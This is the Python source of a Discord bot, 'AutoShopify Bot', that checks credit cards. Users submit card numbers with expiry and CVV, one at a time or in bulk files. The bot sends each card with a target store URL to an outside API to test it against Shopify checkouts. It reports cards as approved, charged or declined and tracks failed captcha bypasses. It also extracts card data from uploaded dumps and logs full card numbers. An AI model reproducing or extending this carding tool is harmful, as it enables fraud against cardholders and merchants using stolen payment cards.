import os
import json
import random
import re
import sqlite3
import sys
import io
import discord
from discord.ext import commands, tasks
import asyncio
import aiohttp
import requests
from dotenv import load_dotenv
import logging
from collections import defaultdict
from datetime import datetime
from typing import Optional, List, Dict
from io import BytesIO

# Fix Windows Unicode encoding issues
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

load_dotenv()

# Regex patterns
SITE_PATTERN = r'https?://\S+'
CC_PATTERN = r'\d{12,16}\|?\s*\d{1,2}\|?\s*\d{2,4}\|?\s*\d{3,4}'

# Configuration from .env
token = os.getenv('TOKEN')
BASE_API = os.getenv('BASE_API', 'https://autoshopify-4wgl.onrender.com')
OWNER_ID = int(os.getenv('OWNER_ID', '0')) if os.getenv('OWNER_ID') else None

# Channel IDs
RULES_CHANNEL_ID = 123456789012345678
SUPPORT_CHANNEL_ID = 123456789012345678
ANNOUNCEMENT_CHANNEL_ID = 123456789012345678

# Setup logging
logging.basicConfig(level=logging.DEBUG)
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger = logging.getLogger('discord')
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

# ======================== DATABASE SETUP ========================

def init_db():
    """Initialize SQLite database for users, admins, and queue"""
    conn = sqlite3.connect('autoshopify.db')
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, username TEXT, is_admin INTEGER DEFAULT 0, 
                  is_banned INTEGER DEFAULT 0, created_at TIMESTAMP)''')
    
    # Queue table
    c.execute('''CREATE TABLE IF NOT EXISTS queue
                 (id INTEGER PRIMARY KEY, user_id INTEGER, site TEXT, cc TEXT, 
                  proxy TEXT, status TEXT, result TEXT, created_at TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

# ======================== USER MANAGEMENT ========================

class UserManager:
    @staticmethod
    def get_or_create_user(user_id: int, username: str):
        """Get or create user in database"""
        conn = sqlite3.connect('autoshopify.db')
        c = conn.cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = c.fetchone()
        
        if not user:
            c.execute('INSERT INTO users VALUES (?, ?, 0, 0, ?)',
                     (user_id, username, datetime.now().isoformat()))
            conn.commit()
        conn.close()
        return user
    
    @staticmethod
    def is_admin(user_id: int) -> bool:
        """Check if user is admin"""
        conn = sqlite3.connect('autoshopify.db')
        c = conn.cursor()
        c.execute('SELECT is_admin FROM users WHERE user_id = ?', (user_id,))
        result = c.fetchone()
        conn.close()
        return result[0] == 1 if result else False
    
    @staticmethod
    def promote_to_admin(user_id: int):
        """Promote user to admin"""
        conn = sqlite3.connect('autoshopify.db')
        c = conn.cursor()
        c.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()
    
    @staticmethod
    def demote_from_admin(user_id: int):
        """Demote user from admin"""
        conn = sqlite3.connect('autoshopify.db')
        c = conn.cursor()
        c.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()

# ======================== QUEUE SYSTEM ========================

class QueueManager:
    def __init__(self):
        self.active_checks = {}  # {user_id: {'stopped': False, 'checking': False}}
    
    def start_check(self, user_id: int):
        """Start checking for a user"""
        if user_id not in self.active_checks:
            self.active_checks[user_id] = {'stopped': False, 'checking': False}
        self.active_checks[user_id]['stopped'] = False
        self.active_checks[user_id]['checking'] = True
    
    def stop_check(self, user_id: int):
        """Stop checking for a user"""
        if user_id in self.active_checks:
            self.active_checks[user_id]['stopped'] = True
    
    def is_checking(self, user_id: int) -> bool:
        """Check if user is currently checking"""
        return self.active_checks.get(user_id, {}).get('checking', False)
    
    def is_stopped(self, user_id: int) -> bool:
        """Check if user has stopped checking"""
        return self.active_checks.get(user_id, {}).get('stopped', False)
    
    def end_check(self, user_id: int):
        """End checking for a user"""
        if user_id in self.active_checks:
            self.active_checks[user_id]['checking'] = False

queue_manager = QueueManager()

# ======================== FILE PARSER ========================

class FileParser:
    @staticmethod
    def extract_ccs(content: str) -> List[str]:
        """Extract credit cards from text using regex"""
        # Match CC format: 1234567890123456|01|2025|123
        pattern = r'\d{12,16}\s*[\|\s]\s*\d{1,2}\s*[\|\s]\s*\d{2,4}\s*[\|\s]\s*\d{3,4}'
        matches = re.findall(pattern, content)
        
        # Clean up matches
        cleaned = []
        for match in matches:
            cleaned_match = re.sub(r'\s+', '', match).replace('|', '|')
            if cleaned_match not in cleaned:
                cleaned.append(cleaned_match)
        
        return cleaned
    
    @staticmethod
    def extract_sites(content: str) -> List[str]:
        """Extract URLs/sites from text"""
        pattern = r'https?://[^\s\n]+'
        matches = re.findall(pattern, content)
        return list(set(matches))

file_parser = FileParser()

# Custom emojis
CUSTOM_EMOJIS = {
    "sparkle": "<a:sparkle_white:123456789012345678>",
    "wave": "<:wave_white:123456789012345678>",
    "heart": "<:heart_white:123456789012345678>",
    "user": "<:user_white:123456789012345678>",
    "id": "<:id_white:123456789012345678>",
    "members": "<:members_white:123456789012345678>",
    "rules": "<:rules_white:123456789012345678>",
    "ticket": "<:ticket_white:123456789012345678>",
    "announcement": "<:announcement_white:123456789012345678>",
}

# ======================== EVENT HANDLERS ========================

@bot.event
async def on_ready():
    """Called when the bot is ready and connected to Discord"""
    print(f'✓ Bot logged in as {bot.user}')
    print(f'✓ Bot ID: {bot.user.id}')
    activity = discord.Activity(type=discord.ActivityType.watching, name="!help")
    await bot.change_presence(activity=activity)
    logger.info(f"Bot ready as {bot.user}")

@bot.event
async def on_member_join(member: discord.Member):
    """Called when a new member joins the server"""
    UserManager.get_or_create_user(member.id, str(member))
    await send_welcome_message(member)

@bot.event
async def on_message(message: discord.Message):
    """Handle incoming messages"""
    if message.author == bot.user:
        return
    
    UserManager.get_or_create_user(message.author.id, str(message.author))
    await bot.process_commands(message)

# ======================== HELPER FUNCTIONS ========================

async def send_welcome_message(member: discord.Member):
    """Send a welcome message to new members"""
    channel = member.guild.system_channel
    if channel is None:
        return
    
    embed = discord.Embed(
        title=f"{CUSTOM_EMOJIS['sparkle']} Welcome to {member.guild.name}",
        description=f"{CUSTOM_EMOJIS['wave']} Hey {member.mention}!\n\nType `!help` for all available commands.",
        color=discord.Color.blurple()
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.add_field(name="Member Count", value=f"`{member.guild.member_count}`", inline=False)
    await channel.send(embed=embed)

def is_owner(ctx) -> bool:
    """Check if user is bot owner"""
    return ctx.author.id == OWNER_ID or ctx.author.guild_permissions.administrator

def is_admin(ctx) -> bool:
    """Check if user is admin"""
    return UserManager.is_admin(ctx.author.id) or is_owner(ctx)

# ======================== COMMANDS - USER ========================

@bot.command(name='menu', help='Show all available commands')
async def help_command(ctx):
    """Show comprehensive help menu"""
    embeds = []
    
    # Main Help
    embed1 = discord.Embed(
        title="📚 AutoShopify Bot - Help Menu",
        description="Complete guide to all commands. React to navigate between pages.",
        color=discord.Color.blurple()
    )
    embed1.add_field(name="🔍 Checking Commands", value="`!chk`, `!batch`, `!stop`", inline=False)
    embed1.add_field(name="📁 File Commands", value="`!parse`, `!extract`", inline=False)
    embed1.add_field(name="👤 User Commands", value="`!profile`, `!status`, `!queue`", inline=False)
    embed1.add_field(name="🛡️ Admin Commands", value="`!promote`, `!demote`, `!ban`", inline=False)
    embed1.add_field(name="📋 Info Commands", value="`!rules`, `!support`, `!info`", inline=False)
    embed1.set_footer(text="Page 1/5 • Use ⬅️➡️ to navigate")
    embeds.append(embed1)
    
    # Checking Commands
    embed2 = discord.Embed(
        title="🔍 Checking Commands",
        color=discord.Color.green()
    )
    embed2.add_field(
        name="!chk <site> <cc|mm|yyyy|cvv> [proxy]",
        value="Check single credit card\nExample: `!chk https://example.com 4532|12|2025|123`",
        inline=False
    )
    embed2.add_field(
        name="!batch <site>",
        value="Check multiple cards from file\nExample: `!batch https://example.com` (attach file)",
        inline=False
    )
    embed2.add_field(
        name="!stop",
        value="Stop current checking operation",
        inline=False
    )
    embed2.set_footer(text="Page 2/5")
    embeds.append(embed2)
    
    # File Commands
    embed3 = discord.Embed(
        title="📁 File Commands",
        color=discord.Color.gold()
    )
    embed3.add_field(
        name="!parse",
        value="Parse attached file for credit cards and sites\nAttach .txt file with CC data",
        inline=False
    )
    embed3.add_field(
        name="!extract <type>",
        value="Extract specific data type\nTypes: `cc`, `sites`, `all`",
        inline=False
    )
    embed3.set_footer(text="Page 3/5")
    embeds.append(embed3)
    
    # User Commands
    embed4 = discord.Embed(
        title="👤 User Commands",
        color=discord.Color.blue()
    )
    embed4.add_field(
        name="!profile",
        value="Show your profile and statistics",
        inline=False
    )
    embed4.add_field(
        name="!status",
        value="Check current checking status",
        inline=False
    )
    embed4.add_field(
        name="!queue",
        value="View checking queue",
        inline=False
    )
    embed4.set_footer(text="Page 4/5")
    embeds.append(embed4)
    
    # Admin Commands
    embed5 = discord.Embed(
        title="🛡️ Admin Commands (Owner Only)",
        color=discord.Color.red()
    )
    embed5.add_field(
        name="!promote <user>",
        value="Promote user to admin",
        inline=False
    )
    embed5.add_field(
        name="!demote <user>",
        value="Demote user from admin",
        inline=False
    )
    embed5.add_field(
        name="!ban <user>",
        value="Ban user from using bot",
        inline=False
    )
    embed5.add_field(
        name="!admins",
        value="List all admins",
        inline=False
    )
    embed5.set_footer(text="Page 5/5")
    embeds.append(embed5)
    
    message = await ctx.send(embed=embeds[0])
    
    # Simple pagination
    await message.add_reaction("⬅️")
    await message.add_reaction("➡️")
    
    current_page = 0
    
    def check(reaction, user):
        return user == ctx.author and reaction.message.id == message.id
    
    while True:
        try:
            reaction, user = await bot.wait_for("reaction_add", check=check, timeout=120.0)
            
            if reaction.emoji == "➡️" and current_page < len(embeds) - 1:
                current_page += 1
                await message.edit(embed=embeds[current_page])
            elif reaction.emoji == "⬅️" and current_page > 0:
                current_page -= 1
                await message.edit(embed=embeds[current_page])
            
            await message.remove_reaction(reaction, user)
        except asyncio.TimeoutError:
            break

@bot.command(name='profile', help='Show your profile')
async def profile(ctx):
    """Show user profile"""
    user_id = ctx.author.id
    is_admin = UserManager.is_admin(user_id)
    
    embed = discord.Embed(
        title=f"{CUSTOM_EMOJIS['user']} Profile - {ctx.author.name}",
        color=discord.Color.blurple()
    )
    embed.add_field(name="User ID", value=f"`{user_id}`", inline=False)
    embed.add_field(name="Admin", value=f"{'✅ Yes' if is_admin else '❌ No'}", inline=True)
    embed.add_field(name="Joined", value=f"`{ctx.author.joined_at.strftime('%Y-%m-%d')}`", inline=True)
    embed.set_thumbnail(url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name='status', help='Check your current status')
async def status_command(ctx):
    """Check current status"""
    is_checking = queue_manager.is_checking(ctx.author.id)
    
    embed = discord.Embed(
        title="Status",
        color=discord.Color.green() if is_checking else discord.Color.red()
    )
    embed.add_field(
        name="Checking",
        value="✅ Yes" if is_checking else "❌ No",
        inline=False
    )
    await ctx.send(embed=embed)

@bot.command(name='queue', help='View queue')
async def queue_command(ctx):
    """View checking queue"""
    embed = discord.Embed(
        title="Queue Status",
        description="Current queue information",
        color=discord.Color.blue()
    )
    embed.add_field(name="Active Users", value=f"`{len(queue_manager.active_checks)}`", inline=False)
    await ctx.send(embed=embed)

# ======================== COMMANDS - CHECKING ========================

@bot.command(name='chk', help='Check single credit card')
async def check_card(ctx, site: str = None, cc_info: str = None, proxy: str = None):
    """Check credit card on a Shopify store"""
    
    UserManager.get_or_create_user(ctx.author.id, str(ctx.author))
    
    if not site or not cc_info:
        embed = discord.Embed(
            title="❌ Invalid Usage",
            description="Usage: `!chk <site> <cc|mm|yyyy|cvv> [proxy]`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    if not re.match(SITE_PATTERN, site):
        embed = discord.Embed(title="❌ Invalid Site", description="Provide valid HTTPS URL", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    cc_parts = cc_info.split('|')
    if len(cc_parts) != 4:
        embed = discord.Embed(title="❌ Invalid CC Format", description="Format: `CC|MM|YYYY|CVV`", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    queue_manager.start_check(ctx.author.id)
    
    checking_embed = discord.Embed(
        title="🔍 Checking Card...",
        description=f"**Site:** {site}\n**Status:** Processing...\n\nType `!stop` to cancel",
        color=discord.Color.blurple()
    )
    status_message = await ctx.send(embed=checking_embed)
    
    try:
        async with aiohttp.ClientSession() as session:
            params = {'site': site, 'cc': cc_info}
            if proxy:
                params['proxy'] = proxy
            
            api_url = f"{BASE_API}/shopify"
            logger.info(f"[{ctx.author}] ========== CHK REQUEST ==========")
            logger.info(f"[{ctx.author}] URL: {api_url}")
            logger.info(f"[{ctx.author}] Site: {site}")
            logger.info(f"[{ctx.author}] CC: {cc_info}")
            logger.info(f"[{ctx.author}] Params: {params}")
            logger.info(f"[{ctx.author}] ================================")
            
            if queue_manager.is_stopped(ctx.author.id):
                await status_message.edit(embed=discord.Embed(title="⏹️ Cancelled", color=discord.Color.orange()))
                return
            
            async with session.get(api_url, params=params, timeout=aiohttp.ClientTimeout(total=30)) as response:
                response_text = await response.text()
                logger.info(f"[{ctx.author}] Response Status: {response.status}")
                logger.info(f"[{ctx.author}] Response Body: {response_text[:500]}")
                
                # Check for 403 Captcha Required
                if response.status == 403:
                    logger.warning(f"[{ctx.author}] Captcha Required (403)")
                    await status_message.edit(embed=discord.Embed(title="⚠️ Captcha Required", description="The API is blocking requests. Captcha verification required.", color=discord.Color.orange()))
                    return
                
                try:
                    result = await response.json()
                    
                    status = result.get('Status', False)
                    response_msg = result.get('Response', 'Unknown')
                    gateway = result.get('Gateway', 'Unknown')
                    price = result.get('Price', 0.0)
                    
                    logger.info(f"[{ctx.author}] Parsed JSON - Status: {status}, Response: {response_msg}, Gateway: {gateway}, Price: {price}")
                    
                    # Check for Captcha Bypass Failed patterns (403 or 402 Site Error)
                    if (gateway == "UNKNOWN" and price == 0.0 and "403" in response_msg) or "Status: 402" in response_msg:
                        await status_message.edit(embed=discord.Embed(title="⚠️ Captcha Bypass Failed", description="The bypass attempt was detected and blocked.", color=discord.Color.orange()))
                        return
                    
                    # Determine actual status by checking response keywords first, then Status field
                    if "CARD_DECLINED" in response_msg.upper():
                        actual_status = False
                    elif "GENERIC_ERROR" in response_msg.upper():
                        actual_status = False
                    else:
                        actual_status = status
                    
                    color = discord.Color.green() if actual_status else discord.Color.red()
                    status_text = "✅ APPROVED" if actual_status else "❌ DECLINED"
                    
                    result_embed = discord.Embed(title=status_text, color=color)
                    result_embed.add_field(name="Site", value=site, inline=False)
                    result_embed.add_field(name="Gateway", value=gateway, inline=True)
                    result_embed.add_field(name="Price", value=f"${price}", inline=True)
                    if response_msg == "CARD_DECLINED":
                        response_msg = random.choice(["😢 "+response_msg, "🤢 "+response_msg, "😭 "+response_msg, "😰 "+response_msg])
                    if response_msg == "GENERIC_ERROR":
                        response_msg = random.choice(["💀 "+response_msg, "☠ "+response_msg, "😭 "+response_msg, "😰 "+response_msg, "👻 "+response_msg])
                    result_embed.add_field(name="Response", value=f"```{response_msg}```", inline=False)
                    
                    await status_message.edit(embed=result_embed)
                except (ValueError, KeyError) as e:
                    logger.error(f"[{ctx.author}] JSON Parsing Error: {str(e)}")
                    logger.error(f"[{ctx.author}] Status: {response.status} | Response: {response_text[:200]}")
                    await status_message.edit(embed=discord.Embed(title="❌ API Error", description="Invalid response from API", color=discord.Color.red()))
    
    except asyncio.TimeoutError:
        logger.error(f"[{ctx.author}] Timeout")
        await status_message.edit(embed=discord.Embed(title="❌ Timeout", color=discord.Color.red()))
    except Exception as e:
        logger.error(f"[{ctx.author}] Exception: {type(e).__name__}: {str(e)}")
        await status_message.edit(embed=discord.Embed(title="❌ Error", description=str(e), color=discord.Color.red()))
    finally:
        queue_manager.end_check(ctx.author.id)

@bot.command(name='batch', help='Check multiple cards from file')
async def batch_check(ctx, site: str = None):
    """Batch check cards from uploaded file with concurrent processing and live progress"""
    
    if not site:
        embed = discord.Embed(title="❌ Invalid Usage", description="Usage: `!batch <site>` (attach file)", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    if not ctx.message.attachments:
        embed = discord.Embed(title="❌ No File", description="Please attach a text file with CC data", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    attachment = ctx.message.attachments[0]
    file_content = await attachment.read()
    content = file_content.decode('utf-8', errors='ignore')
    
    ccs = file_parser.extract_ccs(content)
    
    # Remove duplicates while preserving order
    seen = set()
    unique_ccs = []
    for cc in ccs:
        if cc not in seen:
            seen.add(cc)
            unique_ccs.append(cc)
    ccs = unique_ccs
    
    if not ccs:
        embed = discord.Embed(title="❌ No CCs Found", description="No credit cards found in file", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    queue_manager.start_check(ctx.author.id)
    
    results_embed = discord.Embed(
        title=f"📊 Batch Check - {len(ccs)} Cards",
        description=f"**Site:** {site}\n**Total:** {len(ccs)}\n\nType `!stop` to cancel",
        color=discord.Color.blurple()
    )
    status_message = await ctx.send(embed=results_embed)
    
    approved = []
    charged = []
    declined = []
    errors = []
    processed = 0
    lock = asyncio.Lock()
    
    def get_progress_bar(current, total):
        """Generate emoji progress bar"""
        percent = current / total
        filled = int(20 * percent)
        bar = '█' * filled + '░' * (20 - filled)
        return f"[{bar}] {current}/{total} ({int(percent*100)}%)"
    
    async def check_single_card(session, cc):
        """Check a single card and categorize result"""
        nonlocal processed
        
        if queue_manager.is_stopped(ctx.author.id):
            return
        
        try:
            params = {'site': site, 'cc': cc}
            api_url = f"{BASE_API}/shopify"
            
            logger.info(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] URL: {api_url}")
            logger.info(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] CC: {cc}")
            
            async with session.get(api_url, params=params, timeout=aiohttp.ClientTimeout(total=30)) as response:
                response_text = await response.text()
                logger.info(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] Status: {response.status}")
                logger.info(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] Response: {response_text[:300]}")
                
                # Check for 403 Captcha Required
                if response.status == 403:
                    logger.warning(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] Captcha Required (403)")
                    async with lock:
                        errors.append((cc, "Captcha Required (403)"))
                    return
                
                try:
                    result = await response.json()
                    status = result.get('Status', False)
                    response_msg = result.get('Response', 'Unknown')
                    gateway = result.get('Gateway', 'Unknown')
                    price = result.get('Price', 0.0)
                    
                    logger.info(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] Parsed - Status: {status}, Response: {response_msg}")
                    
                    # Store CC with response details
                    cc_details = f"{cc} | Gateway: {gateway} | Price: ${price} | Response: {response_msg}"
                    
                    # Check for Captcha Bypass Failed patterns (403 or 402 Site Error)
                    if (gateway == "UNKNOWN" and price == 0.0 and "403" in response_msg) or "Status: 402" in response_msg:
                        async with lock:
                            errors.append((cc, "⚠️ Captcha Bypass Failed \n Change SITE"))
                    elif gateway == "UNKNOWN" and price == 0.0 and "Failed to get session token" in response_msg:
                        async with lock:
                            errors.append((cc, "⚠️ Failed to get session token"))
                    # Check for declined/error keywords FIRST (trust response message over Status)
                    elif "CARD_DECLINED" in response_msg.upper() or "GENERIC_ERROR" in response_msg.upper():
                        async with lock:
                            declined.append(cc_details)
                    # Check for charged
                    elif "CHARGED" in response_msg.upper():
                        async with lock:
                            charged.append(cc_details)
                    # Fall back to Status field
                    elif status == True:
                        async with lock:
                            approved.append(cc_details)
                    else:
                        async with lock:
                            declined.append(cc_details)
                except (ValueError, KeyError) as e:
                    logger.error(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] JSON Parse Error: {str(e)}")
                    async with lock:
                        errors.append((cc, "Invalid API response"))
        except Exception as e:
            logger.error(f"[{ctx.author}] [BATCH {processed+1}/{len(ccs)}] Exception: {str(e)}")
            async with lock:
                errors.append((cc, str(e)))
        finally:
            async with lock:
                processed += 1
    
    # Process cards with concurrent requests (max 5 at a time)
    try:
        async with aiohttp.ClientSession() as session:
            semaphore = asyncio.Semaphore(5)  # Max 5 concurrent requests
            
            async def check_with_semaphore(cc):
                async with semaphore:
                    await check_single_card(session, cc)
            
            # Create tasks for all CCs
            tasks = [check_with_semaphore(cc) for cc in ccs]
            
            # Process with progress updates
            for i, task in enumerate(asyncio.as_completed(tasks)):
                await task
                
                # Update progress every 5 cards or at the end
                if (processed % 5 == 0) or (processed == len(ccs)):
                    progress_bar = get_progress_bar(processed, len(ccs))
                    progress_embed = discord.Embed(
                        title=f"📊 Batch Check Progress",
                        description=f"{progress_bar}\n\n✅ Approved: {len(approved)}\n💳 Charged: {len(charged)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}",
                        color=discord.Color.blurple()
                    )
                    try:
                        await status_message.edit(embed=progress_embed)
                    except:
                        pass  # Message might be deleted
    except Exception as e:
        logger.error(f"[{ctx.author}] Batch processing error: {str(e)}")
        await status_message.edit(embed=discord.Embed(title="❌ Error", description=str(e), color=discord.Color.red()))
        queue_manager.end_check(ctx.author.id)
        return
    
    # Prepare final results
    needs_file = len(approved) >= 10 or len(charged) >= 10 or len(declined) >= 10 or len(errors) >= 10
    
    final_embed = discord.Embed(
        title="✅ Batch Check Complete",
        color=discord.Color.green()
    )
    final_embed.add_field(name="Total Checked", value=f"`{len(ccs)}`", inline=True)
    final_embed.add_field(name="✅ Approved", value=f"`{len(approved)}`", inline=True)
    final_embed.add_field(name="💳 Charged", value=f"`{len(charged)}`", inline=True)
    final_embed.add_field(name="❌ Declined", value=f"`{len(declined)}`", inline=True)
    final_embed.add_field(name="⚠️ Errors", value=f"`{len(errors)}`", inline=True)
    
    if needs_file:
        final_embed.add_field(name="📄 Details", value="Full results saved to file (see attachment)", inline=False)
    
    await status_message.edit(embed=final_embed)
    
    # Send categorized results as embeds
    if approved:
        approved_embed = discord.Embed(title="✅ Approved Cards", color=discord.Color.green())
        for idx, cc_detail in enumerate(approved[:10], 1):
            approved_embed.add_field(name=f"{idx}. {approved[idx-1].split('|')[0]}", value=cc_detail, inline=False)
        if len(approved) > 10:
            approved_embed.set_footer(text=f"... and {len(approved) - 10} more approved cards")
        await ctx.send(embed=approved_embed)
    
    if charged:
        charged_embed = discord.Embed(title="💳 Charged Cards", color=discord.Color.blue())
        for idx, cc_detail in enumerate(charged[:10], 1):
            charged_embed.add_field(name=f"{idx}. {charged[idx-1].split('|')[0]}", value=cc_detail, inline=False)
        if len(charged) > 10:
            charged_embed.set_footer(text=f"... and {len(charged) - 10} more charged cards")
        await ctx.send(embed=charged_embed)
    
    if declined:
        declined_embed = discord.Embed(title="❌ Declined Cards", color=discord.Color.red())
        for idx, cc_detail in enumerate(declined[:10], 1):
            declined_embed.add_field(name=f"{idx}. {declined[idx-1].split('|')[0]}", value=cc_detail, inline=False)
        if len(declined) > 10:
            declined_embed.set_footer(text=f"... and {len(declined) - 10} more declined cards")
        await ctx.send(embed=declined_embed)
    
    if errors:
        errors_embed = discord.Embed(title="⚠️ Errors", color=discord.Color.orange())
        for idx, (cc, error) in enumerate(errors[:10], 1):
            errors_embed.add_field(name=f"{idx}. {cc}", value=f"Error: {error}", inline=False)
        if len(errors) > 10:
            errors_embed.set_footer(text=f"... and {len(errors) - 10} more errors")
        await ctx.send(embed=errors_embed)
    
    # Create and send results file if needed
    if needs_file:
        results_content = f"BATCH CHECK RESULTS\n"
        results_content += f"{'='*80}\n"
        results_content += f"Site: {site}\n"
        results_content += f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        results_content += f"Total Checked: {len(ccs)}\n"
        results_content += f"{'='*80}\n\n"
        
        results_content += f"✅ APPROVED ({len(approved)}):\n"
        results_content += f"{'-'*80}\n"
        for idx, cc_detail in enumerate(approved[:10], 1):
            results_content += f"{idx}. {cc_detail}\n"
        if len(approved) > 10:
            results_content += f"\n... and {len(approved) - 10} more approved cards\n"
        results_content += "\n"
        
        results_content += f"💳 CHARGED ({len(charged)}):\n"
        results_content += f"{'-'*80}\n"
        for idx, cc_detail in enumerate(charged[:10], 1):
            results_content += f"{idx}. {cc_detail}\n"
        if len(charged) > 10:
            results_content += f"\n... and {len(charged) - 10} more charged cards\n"
        results_content += "\n"
        
        results_content += f"❌ DECLINED ({len(declined)}):\n"
        results_content += f"{'-'*80}\n"
        for idx, cc_detail in enumerate(declined[:10], 1):
            results_content += f"{idx}. {cc_detail}\n"
        if len(declined) > 10:
            results_content += f"\n... and {len(declined) - 10} more declined cards\n"
        results_content += "\n"
        
        results_content += f"⚠️ ERRORS ({len(errors)}):\n"
        results_content += f"{'-'*80}\n"
        for idx, (cc, error) in enumerate(errors[:10], 1):
            results_content += f"{idx}. {cc}: {error}\n"
        if len(errors) > 10:
            results_content += f"\n... and {len(errors) - 10} more errors\n"
        
        # Create BytesIO object with UTF-8 BOM for proper emoji support
        file_buffer = BytesIO(results_content.encode('utf-8-sig'))
        file_buffer.seek(0)
        
        # Send file with proper filename
        timestamp = int(datetime.now().timestamp())
        filename = f"batch_results_{ctx.author.id}_{timestamp}.txt"
        
        try:
            await ctx.send(file=discord.File(file_buffer, filename=filename))
            logger.info(f"[{ctx.author}] File sent successfully: {filename}")
        except Exception as e:
            logger.error(f"[{ctx.author}] Failed to send file: {str(e)}")
            await ctx.send(embed=discord.Embed(title="❌ File Error", description=f"Could not send results file: {str(e)}", color=discord.Color.red()))
    
    queue_manager.end_check(ctx.author.id)

@bot.command(name='stop', help='Stop current operation')
async def stop_check(ctx):
    """Stop checking operation"""
    queue_manager.stop_check(ctx.author.id)
    embed = discord.Embed(title="⏹️ Stopping...", description="Current operation will stop", color=discord.Color.orange())
    await ctx.send(embed=embed)

# ======================== COMMANDS - FILE PARSING ========================

@bot.command(name='parse', help='Parse file for CC data')
async def parse_file(ctx):
    """Parse attached file for CCs and sites"""
    
    if not ctx.message.attachments:
        embed = discord.Embed(title="❌ No File", description="Please attach a text file", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    attachment = ctx.message.attachments[0]
    file_content = await attachment.read()
    content = file_content.decode('utf-8', errors='ignore')
    
    ccs = file_parser.extract_ccs(content)
    sites = file_parser.extract_sites(content)
    
    embed = discord.Embed(
        title="📊 File Parse Results",
        color=discord.Color.blue()
    )
    embed.add_field(name="📋 File", value=f"`{attachment.filename}`", inline=False)
    embed.add_field(name="💳 CCs Found", value=f"`{len(ccs)}`", inline=True)
    embed.add_field(name="🌐 Sites Found", value=f"`{len(sites)}`", inline=True)
    
    if ccs:
        embed.add_field(name="Sample CCs", value=f"```{chr(10).join(ccs[:3])}{'...' if len(ccs) > 3 else ''}```", inline=False)
    
    if sites:
        embed.add_field(name="Sample Sites", value=f"```{chr(10).join(sites[:3])}{'...' if len(sites) > 3 else ''}```", inline=False)
    
    await ctx.send(embed=embed)

@bot.command(name='extract', help='Extract specific data from file')
async def extract_data(ctx, data_type: str = None):
    """Extract specific data type"""
    
    if not ctx.message.attachments:
        embed = discord.Embed(title="❌ No File", description="Please attach a file", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    if data_type not in ['cc', 'sites', 'all']:
        embed = discord.Embed(title="❌ Invalid Type", description="Types: `cc`, `sites`, `all`", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    attachment = ctx.message.attachments[0]
    file_content = await attachment.read()
    content = file_content.decode('utf-8', errors='ignore')
    
    if data_type in ['cc', 'all']:
        ccs = file_parser.extract_ccs(content)
        cc_text = '\n'.join(ccs)
        if len(cc_text) > 1900:
            cc_text = cc_text[:1900] + '...'
        embed = discord.Embed(title=f"💳 Extracted CCs ({len(ccs)})", description=f"```{cc_text}```", color=discord.Color.green())
        await ctx.send(embed=embed)
    
    if data_type in ['sites', 'all']:
        sites = file_parser.extract_sites(content)
        sites_text = '\n'.join(sites)
        if len(sites_text) > 1900:
            sites_text = sites_text[:1900] + '...'
        embed = discord.Embed(title=f"🌐 Extracted Sites ({len(sites)})", description=f"```{sites_text}```", color=discord.Color.blue())
        await ctx.send(embed=embed)

# ======================== COMMANDS - ADMIN ========================

@bot.command(name='promote', help='Promote user to admin [OWNER ONLY]')
async def promote(ctx, user: discord.User = None):
    """Promote user to admin"""
    
    if not is_owner(ctx):
        embed = discord.Embed(title="❌ Permission Denied", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    if not user:
        embed = discord.Embed(title="❌ User Not Found", description="Usage: `!promote <user>`", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    UserManager.promote_to_admin(user.id)
    logger.info(f"[{ctx.author}] Promoted {user} to admin")
    
    embed = discord.Embed(
        title="✅ Promoted",
        description=f"{user.mention} is now an admin!",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command(name='demote', help='Demote user from admin [OWNER ONLY]')
async def demote(ctx, user: discord.User = None):
    """Demote user from admin"""
    
    if not is_owner(ctx):
        embed = discord.Embed(title="❌ Permission Denied", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    if not user:
        embed = discord.Embed(title="❌ User Not Found", description="Usage: `!demote <user>`", color=discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    UserManager.demote_from_admin(user.id)
    logger.info(f"[{ctx.author}] Demoted {user} from admin")
    
    embed = discord.Embed(
        title="✅ Demoted",
        description=f"{user.mention} is no longer an admin",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command(name='admins', help='List all admins [ADMIN ONLY]')
